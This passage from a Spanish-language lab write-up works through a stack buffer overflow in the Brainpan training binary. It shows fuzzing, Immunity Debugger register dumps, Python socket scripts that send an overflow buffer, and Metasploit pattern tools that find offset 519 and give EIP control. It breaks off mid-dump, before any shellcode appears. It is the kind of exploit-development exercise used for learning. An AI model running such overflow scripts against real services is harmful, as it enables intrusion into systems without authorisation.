</span></span><span style="display:flex;"><span>0BADF00D    0x76a40000 | 0x76b30000 | 0x000f0000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>RPCRT4.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\R</span>PCRT4.dll<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D    0x76a20000 | 0x76a39000 | 0x00019000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>sechost.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\s</span>echost.dll<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>0BADF00D
</span></span><span style="display:flex;"><span>0BADF00D   <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Preparing output file <span style="color:#e6db74">&#39;modules.txt&#39;</span>
</span></span><span style="display:flex;"><span>0BADF00D       - <span style="color:#f92672">(</span>Re<span style="color:#f92672">)</span>setting logfile c:<span style="color:#ae81ff">\\</span>mona<span style="color:#ae81ff">\\</span>brainpan<span style="color:#ae81ff">\m</span>odules.txt
</span></span><span style="display:flex;"><span>0BADF00D
</span></span><span style="display:flex;"><span>0BADF00D   <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> This mona.py action took 0:00:00.083000
</span></span><span style="display:flex;"><span>0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
</span></span></code></pre></div><p>Vemos que hay un módulo llamado brainpan.exe que es el que nos interesa.</p>
<h2 id="fuzzing">Fuzzing</h2>
<p>Al analizarlo con netcat, pude comprobar que el programa consiste en un banner de bienvenida y un campo para introducir una contraseña. Si introducimos una contraseña incorrecta, el programa nos devuelve un mensaje de error. Sabiendo que el programa es vulnerable a un buffer overflow, intento averiguar ver cuántos bytes necesito para sobreescribir el EIP.</p>
<p>El campo de contraseña es posible que tenga un límite de caracteres, así que voy a enviar un mensaje exageradamente largo para ver si se rompe el programa. Para ello, creo una cadena de 1000 caracteres y la envío al programa con netcat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Creo una cadena de 1000 caracteres</span>
</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#34;print(&#39;A&#39;*1000)&#34;</span>
</span></span></code></pre></div><p>Reviso Inmunity Debugger y veo que el programa se ha roto y que el EIP ha sido sobrescrito con 41414141:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EAX <span style="color:#ae81ff">00000001</span>
</span></span><span style="display:flex;"><span>ECX 3117303F ASCII <span style="color:#e6db74">&#34;shitstorm
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>EDX 0028F720
</span></span><span style="display:flex;"><span>EBX 7EFDE000
</span></span><span style="display:flex;"><span>ESP 0028F930 ASCII <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EBP 41414141
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ESI 00000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EDI 00000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EIP 41414141
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">C 0  ES 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">P 0  CS 0023 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">A 0  SS 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Z 0  DS 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S 0  FS 0053 32bit 7EFDD000(FFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">T 0  GS 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">D 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">O 0  LastErr ERROR_SUCCESS (00000000)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST0 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST1 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST2 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST3 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST4 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST5 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST6 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST7 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">               3 2 1 0      E S P U O Z D I
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FCW 037F  Prec NEAR,64  Mask    1 1 1 1 1 1
</span></span></span></code></pre></div><p><strong>Análisis del volcado de memoria</strong></p>
<ol>
<li>
<p><strong>EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI:</strong> Estos son registros de propósito general y punteros utilizados por la CPU. El valor <code>41414141</code> en EBP y EIP sugiere un posible desbordamiento de búfer, ya que es una secuencia de &lsquo;A&rsquo; (0x41), que es el valor que se ha utilizado para rellenar el búfer.</p>
</li>
<li>
<p><strong>EIP (Instruction Pointer):</strong> Contiene la dirección de la próxima instrucción que se ejecutará. Ha sido sobrescrito con &lsquo;A&rsquo; (0x41). Este es un indicador típico de un desbordamiento de búfer.</p>
</li>
<li>
<p><strong>ESP (Stack Pointer):</strong> Indica la dirección actual en la pila. También contiene una secuencia de &lsquo;A&rsquo;, lo que sugiere que el desbordamiento de búfer podría haber afectado la pila.</p>
</li>
<li>
<p><strong>EBP (Base Pointer):</strong> Normalmente, se utiliza para apuntar al comienzo de un marco de pila. El valor <code>41414141</code> indica que también ha sido sobrescrito y podría ser parte de un intento de controlar la ejecución.</p>
</li>
<li>
<p><strong>Pila (Stack):</strong> La información en la pila muestra una cadena repetitiva de &lsquo;A&rsquo; (0x41), lo cual es un indicador clásico de un desbordamiento de búfer.</p>
</li>
<li>
<p><strong>EIP con &lsquo;41414141&rsquo;:</strong> La dirección de retorno (EIP) ha sido sobrescrita con &lsquo;A&rsquo; (0x41), lo que indica un posible desbordamiento de búfer que ha alterado la dirección de retorno.</p>
</li>
</ol>
<h2 id="control-del-eip">Control del EIP</h2>
<p>Sabiendo que el programa es vulnerable a un buffer overflow, voy a intentar explotarlo con Python. Para ello, voy a utilizar el módulo socket para conectarme al programa y enviarle una cadena de 1000 caracteres. Para ver si el programa se ha roto, voy a enviarle una cadena de 1000 caracteres &lsquo;A&rsquo; y voy a ver si el EIP se ha sobrescrito con &lsquo;A&rsquo; (0x41).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.56.101&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EAX FFFFFFFF
</span></span><span style="display:flex;"><span>ECX 3117303F ASCII <span style="color:#e6db74">&#34;shitstorm
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>EDX 0028F720 ASCII <span style="color:#e6db74">&#34;k3ss AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EBX 7EFDE000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ESP 0028F930 ASCII &#34;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span>EBP <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span>ESI <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>EDI <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>EIP <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span>C <span style="color:#ae81ff">0</span>  ES 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>P <span style="color:#ae81ff">1</span>  CS <span style="color:#ae81ff">0023</span> 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>A <span style="color:#ae81ff">0</span>  SS 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Z <span style="color:#ae81ff">0</span>  DS 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>S <span style="color:#ae81ff">1</span>  FS <span style="color:#ae81ff">0053</span> 32bit 7EFDD000<span style="color:#f92672">(</span>FFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>T <span style="color:#ae81ff">0</span>  GS 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>D <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>O <span style="color:#ae81ff">0</span>  LastErr ERROR_SUCCESS <span style="color:#f92672">(</span>00000000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>EFL <span style="color:#ae81ff">00010286</span> <span style="color:#f92672">(</span>NO,NB,NE,A,S,PE,L,LE<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ST0 empty g
</span></span><span style="display:flex;"><span>ST1 empty g
</span></span><span style="display:flex;"><span>ST2 empty g
</span></span><span style="display:flex;"><span>ST3 empty g
</span></span><span style="display:flex;"><span>ST4 empty g
</span></span><span style="display:flex;"><span>ST5 empty g
</span></span><span style="display:flex;"><span>ST6 empty g
</span></span><span style="display:flex;"><span>ST7 empty g
</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>      E S P U O Z D I
</span></span><span style="display:flex;"><span>FST <span style="color:#ae81ff">0000</span>  Cond <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  Err <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>GT<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>FCW 037F  Prec NEAR,64  Mask    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Una vez ejecutado el script, compruebo Inmunity Debugger y veo que el EIP se ha sobrescrito con &lsquo;A&rsquo; (0x41). Ahora hay que averiguar el offset para sobrescribir el EIP con una dirección de memoria que apunte a un salto a la shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_create -l <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
</span></span></code></pre></div><p>Sustituimos la cadena de 1000 caracteres por la cadena generada por msf-pattern_create y ejecutamos el script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EAX FFFFFFFF
</span></span><span style="display:flex;"><span>ECX 3117303F ASCII <span style="color:#e6db74">&#34;shitstorm
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>EDX 0028F720 ASCII <span style="color:#e6db74">&#34;k3ss Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5A
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EBX 7EFDE000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ESP 0028F930 ASCII &#34;</span>r4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1A
</span></span><span style="display:flex;"><span>EBP <span style="color:#ae81ff">32724131</span>
</span></span><span style="display:flex;"><span>ESI <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>EDI <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>EIP <span style="color:#ae81ff">41337241</span>
</span></span><span style="display:flex;"><span>C <span style="color:#ae81ff">0</span>  ES 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>P <span style="color:#ae81ff">1</span>  CS <span style="color:#ae81ff">0023</span> 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>A <span style="color:#ae81ff">0</span>  SS 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Z <span style="color:#ae81ff">0</span>  DS 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>S <span style="color:#ae81ff">1</span>  FS <span style="color:#ae81ff">0053</span> 32bit 7EFDD000<span style="color:#f92672">(</span>FFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>T <span style="color:#ae81ff">0</span>  GS 002B 32bit 0<span style="color:#f92672">(</span>FFFFFFFF<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>D <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>O <span style="color:#ae81ff">0</span>  LastErr ERROR_SUCCESS <span style="color:#f92672">(</span>00000000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>EFL <span style="color:#ae81ff">00010286</span> <span style="color:#f92672">(</span>NO,NB,NE,A,S,PE,L,LE<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ST0 empty g
</span></span><span style="display:flex;"><span>ST1 empty g
</span></span><span style="display:flex;"><span>ST2 empty g
</span></span><span style="display:flex;"><span>ST3 empty g
</span></span><span style="display:flex;"><span>ST4 empty g
</span></span><span style="display:flex;"><span>ST5 empty g
</span></span><span style="display:flex;"><span>ST6 empty g
</span></span><span style="display:flex;"><span>ST7 empty g
</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>      E S P U O Z D I
</span></span><span style="display:flex;"><span>FST <span style="color:#ae81ff">0000</span>  Cond <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  Err <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>GT<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>FCW 037F  Prec NEAR,64  Mask    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Vemos que el EIP se ha sobrescrito con 41337241. Ahora vamos a averiguar el offset para sobrescribir el EIP con una dirección de memoria que apunte a un salto a la shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -q <span style="color:#ae81ff">41337241</span> -l <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">519</span>
</span></span></code></pre></div><p>Solo tengo que añadir 519 &lsquo;A&rsquo; a la cadena de 1000 caracteres y enviarla al programa para sobrescribir el EIP con la dirección de memoria que apunta a un salto a la shellcode. Dejo el payload vacío para ver si el programa y añado un retn con BBBB para ver si el EIP se ha sobrescrito con BBBB.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.56.101&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">519</span>
</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;BBBB&#34;</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EAX FFFFFFFF
</span></span><span style="display:flex;"><span>ECX 3117303F ASCII <span style="color:#e6db74">&#34;shitstorm
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>EDX 0028F720 ASCII <span style="color:#e6db74">&#34;k3ss AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EBX 7EFDE000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ESP 0028F930 ASCII &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EBP 41414141
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ESI 00000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EDI 00000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EIP 42424242
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">C 0  ES 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">P 1  CS 0023 32bit 0(FFFFFFFF)
